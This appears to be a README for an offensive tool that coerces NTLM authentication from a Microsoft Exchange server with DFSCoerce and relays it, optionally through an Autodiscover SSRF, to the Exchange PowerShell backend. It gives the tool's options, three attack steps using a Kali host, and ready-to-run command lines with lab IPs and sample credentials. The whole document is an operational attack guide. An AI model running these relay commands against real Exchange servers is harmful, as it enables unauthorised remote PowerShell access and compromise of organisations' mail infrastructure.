~~~shell script
usage: ProxyRelay_Powershell.py [-h] [-debug] [-t TARGET] [-p PASSWORD] [-u USERNAME] [-ns NTLM_SOURCE] [-nl NTLM_LISTEN] [-d DOMAIN] [-smb2support]

For every connection received, this module will try to relay that connection to specified target(s) system or the original client

Main options:
  -h, --help            show this help message and exit
  -debug                Turn DEBUG output ON
  -t TARGET, --target TARGET
                        Target backend powershell path, example: https://192.168.152.131:444/powershell
  -p PASSWORD, --password PASSWORD
                        password for DFSCoerce
  -u USERNAME, --username USERNAME
                        user name for DfsCoerce
  -ns NTLM_SOURCE, --ntlm-source NTLM_SOURCE
                        ntlm relay source ip, shouble be an exchange server ip
  -nl NTLM_LISTEN, --ntlm-listen NTLM_LISTEN
                        IP address of interface to bind SMB and HTTP servers, and Dfscoerce will trigger an ntlm authentication to this ip, so it can't be 0.0.0.0
  -d DOMAIN, --domain DOMAIN
                        domain name of exchange domain
  -smb2support          SMB2 Support
  -ssrf                 use autodiscover frontend ssrf to proxy to powershell
~~~

This script relay ntlm to autodiscover frontend, which then proxies connection to the powershell backend. Or replay ntlm directly to the powershell backend.

Trigger ntlm request with dfscoerce.



**Step1:** 

Modify the HOST variable in proxy.py to point to your kali. Then run proxy.py on the windows attack host.

It will listen for local powershell connections and proxy to kali.

**Step2:**

Run ProxyRelay_Powershell.py on you kali host.

It will do ntlm relay and proxy the powershell connection after authentication is done.

**Step3:**

Run localpowershell.ps1 on the windows attack host.



**Relay ntlm to Autodiscover Frontend**

python3 ./ProxyRelay_Powershell.py -smb2support -t "https://192.168.152.131:444/powershell" -nl "192.168.152.157" -d "server.cd"  -ns "192.168.152.132" -u "test@server.cd" -p "P@ssword123"



**Relay ntlm to Powershell Backend**

python3 ./ProxyRelay_Powershell.py -smb2support -t "https://192.168.152.131" -nl "192.168.152.157" -d "server.cd"  -ns "192.168.152.132" -u "test@server.cd" -p "P@ssword123"  -ssrf



